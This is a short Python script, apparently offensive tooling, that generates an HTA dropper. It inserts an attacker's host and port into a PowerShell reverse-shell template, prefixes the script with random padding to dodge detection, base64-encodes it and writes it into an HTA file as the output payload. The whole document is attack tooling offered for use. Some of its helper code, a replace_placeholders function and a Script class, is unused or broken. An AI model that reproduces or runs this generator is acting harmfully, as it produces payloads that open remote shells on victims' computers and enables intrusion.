import sys
import random
import string
import base64

def generate_garbage():
    garbage = ""
    for i in range(10):
        length = random.randint(1, 10)
        garbage += ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
    return garbage

def replace_placeholders(script, placeholders):
    for placeholder in placeholders:
        value = getattr(script, placeholder)
        script._replace_at('<' + placeholder + '>', value)

def main():
    if len(sys.argv) < 4:
        print("Usage: python generator.py <HOST> <PORT> <OUT_FILE>")
        exit(1)

    host = sys.argv[1]
    port = sys.argv[2]
    out_file = sys.argv[3]

    reverse_shell_ps4 = open("reverse_shell.ps1").read().replace('<HOST>', host).replace('<PORT>', port)
    reverse_shell_ps4 = reverse_shell_ps4.strip()
    reverse_shell_ps4 = generate_garbage() + '\n' + reverse_shell_ps4

    b64_encoded_payload = str(base64.b64encode(reverse_shell_ps4.encode()), 'utf-8')
    js = open("initialize.hta").read()
    js = js.replace('<B64-PAYLOAD>', b64_encoded_payload)

    open(out_file, 'w').write(js)
    print(f'Payload saved to: {out_file}')

class Script:
    def __init__(self, *args):
        self.reverse_shell_ps4 = ' '.join([str(x) for x in args])

    def _replace_at(self, target, replacement):
        self.reverse_shell_ps4 = self.reverse_shell_ps4.replace(target, replacement)

main()
